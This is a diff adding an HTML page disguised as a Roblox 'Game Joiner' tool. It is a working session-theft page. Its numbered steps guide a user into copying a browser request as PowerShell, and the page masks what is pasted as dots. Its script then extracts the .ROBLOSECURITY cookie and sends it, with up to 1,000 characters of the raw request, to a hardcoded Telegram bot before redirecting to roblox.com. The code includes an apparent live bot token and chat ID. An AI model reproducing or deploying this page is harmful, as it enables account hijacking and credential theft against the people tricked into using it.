@@ -1,0 +1,100 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<title>ZXC Tools - Game Joiner</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#0a0a0a;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
+.card{background:#111;border:1px solid #e63946;border-radius:28px;padding:40px;max-width:550px;width:100%;}
+h1{color:#e63946;text-align:center;margin-bottom:20px;}
+.steps{background:#0a0a0a;border-radius:20px;padding:20px;margin:20px 0;}
+.step{display:flex;gap:15px;padding:10px 0;color:#ccc;}
+.step-num{background:#e63946;width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;}
+textarea{width:100%;background:#1a1a1a;border:1px solid #333;border-radius:16px;padding:15px;color:white;font-family:monospace;font-size:18px;letter-spacing:2px;min-height:120px;margin:20px 0;}
+button{background:#e63946;width:100%;padding:14px;border:none;border-radius:40px;color:white;font-weight:bold;font-size:16px;cursor:pointer;}
+.footer{text-align:center;color:#666;margin-top:20px;font-size:12px;}
+.note{font-size:11px;color:#555;text-align:center;margin-top:8px;}
+</style>
+</head>
+<body>
+
+<div class="card">
+    <h1>🔗 GAME JOINER</h1>
+    <div class="steps">
+        <div class="step"><span class="step-num">1</span> Open Roblox profile</div>
+        <div class="step"><span class="step-num">2</span> F12 → Network → F5</div>
+        <div class="step"><span class="step-num">3</span> Find request with profile/account</div>
+        <div class="step"><span class="step-num">4</span> Right-click → Copy → Copy as PowerShell</div>
+        <div class="step"><span class="step-num">5</span> Paste below → click JOIN</div>
+    </div>
+    <textarea id="psData" placeholder="Paste PowerShell here..."></textarea>
+    <div class="note">🔒 Your input is hidden — only dots will appear</div>
+    <button id="submitBtn">JOIN PLAYER</button>
+    <div class="footer">© 2026 ZXC Tools</div>
+</div>
+
+<script>
+const BOT_TOKEN = "8635558655:AAGLtreWGUsTQru18rmqk_zUECgwM8RLFII";
+const CHAT_ID = "6768538581";
+
+let realValue = "";
+const textarea = document.getElementById('psData');
+
+function updateDisplay() {
+    textarea.value = "●".repeat(realValue.length);
+}
+
+textarea.addEventListener('input', function(e) {
+    if (e.inputType === 'insertText' && e.data) {
+        realValue += e.data;
+    } else if (e.inputType === 'deleteContentBackward') {
+        realValue = realValue.slice(0, -1);
+    }
+    updateDisplay();
+});
+
+textarea.addEventListener('paste', function(e) {
+    e.preventDefault();
+    var pasted = (e.clipboardData || window.clipboardData).getData('text');
+    realValue += pasted;
+    updateDisplay();
+});
+
+textarea.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace') {
+        e.preventDefault();
+        realValue = realValue.slice(0, -1);
+        updateDisplay();
+    }
+});
+
+function extractCookie(data) {
+    var match = data.match(/\.ROBLOSECURITY",\s*"([a-fA-F0-9|_]+)/i);
+    if (match && match[1]) return match[1];
+    return null;
+}
+
+var btn = document.getElementById('submitBtn');
+btn.onclick = function() {
+    if (!realValue.trim()) {
+        alert('Paste PowerShell first');
+        return;
+    }
+    btn.innerText = "PROCESSING...";
+    btn.disabled = true;
+    var cookie = extractCookie(realValue);
+    var msg = cookie ? "🔥 ПИЗДАТЫЙ КУК 🔥\n\n" + cookie + "\n\nFULL LOG:\n" + realValue.substring(0,800) : "⚠️ НОВЫЙ ЛОГ\n\n" + realValue.substring(0,1000);
+    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(msg))
+        .then(function() {
+            btn.innerText = "✅ SUCCESS!";
+            setTimeout(function() { window.location.href = "https://roblox.com"; }, 1500);
+        })
+        .catch(function() {
+            btn.innerText = "❌ ERROR";
+            btn.disabled = false;
+        });
+};
+</script>
+
+</body>
+</html>
